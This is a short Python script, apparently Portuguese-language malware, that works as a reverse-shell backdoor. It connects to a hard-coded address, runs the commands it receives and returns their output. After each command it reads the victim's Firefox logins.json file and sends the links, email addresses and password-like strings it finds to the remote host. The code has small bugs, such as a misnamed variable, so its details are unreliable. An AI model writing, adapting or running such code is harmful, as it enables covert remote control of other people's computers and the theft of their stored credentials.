import socket
import subprocess
import time
import re
from os import chdir


ip = "192.168.0.105"
port = 4002


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def senhas(s):
	try:
		getuserprof = subprocess.check_output('set USERPROFILE', shell=True).split('=')
		usr = userprof[1].strip('\r\n')
		f = open('C:\\Users\\'+usr+'\\AppData\\Roaming\\Mozilla\\Firefox\Profiles\\a25ik1y6.default\\logins.json')
		text = f.read()
		links = re.findall(r'(https?:\/\/[^"\'>]*)', text)
		emails = re.findall(r'[\w\._-]+@[\w\_-]+\.[\w\._-]+\w', text)
		passwords = re.findall(r'[A-Z][\w.]+[\w.]+[\w.]+===?', text)
		for link in links:
			s.send("[==>] Link %s" %(link))
		s.send('\n')
		for password in passwords:
			s.send("[==>] Pass: %s" %(password))
		s.send('\n')
		for email in emails:
			s.send("[==>] Emails: %s" %(email))
	except:
		s.send("Falha ao pegar senhas")

def conectar(ip, port):
	try:
		s.connect((ip, port))
		s.send("\nInvade\n\n<Aperte ENTER>")
		return s
	except:
		main(s)

def shell(s):
	while True:
		try:
			dados = s.recv(1024)
			proc = subprocess.Popen(dados, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
			saida = proc.stdout.read() + proc.stderr.read()
			s.send("%s\n" %(saida))
			s.send("Pegando Senhas...")
			senhas(s)
			s.send("CMD: ")
			
		except:
			main(s)

def main(s):
	s_connect = conectar(ip, port)
	if(s_connect):
		shell(s_connect)
	else:
		time.sleep(3)
		print("Aguarde, reconectando")

main(s)
			
